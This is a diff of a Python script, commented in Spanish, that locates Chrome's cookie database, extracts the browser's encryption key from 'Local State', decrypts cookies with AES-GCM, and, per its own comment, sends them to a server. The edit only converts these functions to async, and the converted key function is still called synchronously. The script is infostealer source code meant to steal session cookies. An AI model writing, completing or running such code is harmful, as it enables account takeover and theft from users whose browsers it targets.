@@ -86,7 +86,7 @@ localStatePath = os.path.join(chromePath, 'Local State')
 cookiesPath = os.path.join(chromePath, 'Default', 'Network', 'Cookies')
 
 # Función para obtener la clave de cifrado
-def getEncryptionKey():
+async def getEncryptionKey():
     try:
         with open(localStatePath, 'r', encoding='utf-8') as file:
             localStateData = json.load(file)
@@ -98,7 +98,7 @@ def getEncryptionKey():
         exit(0)
 encriptation_key = getEncryptionKey()
 # Función para descifrar las cookies
-def decryptCookie(encrypted_value, key):
+async def decryptCookie(encrypted_value, key):
     try:
         # Chrome usa AES-GCM para cifrar las cookies
         nonce = encrypted_value[3:15]  # Extraer el nonce (parte inicial del cifrado)
@@ -112,7 +112,7 @@ def decryptCookie(encrypted_value, key):
         return None
 
 # Función para obtener y enviar cookies al servidor
-def get_cookies():
+async def get_cookies():
     key = getEncryptionKey()
     
     # Abre la base de datos de cookies en modo lectura
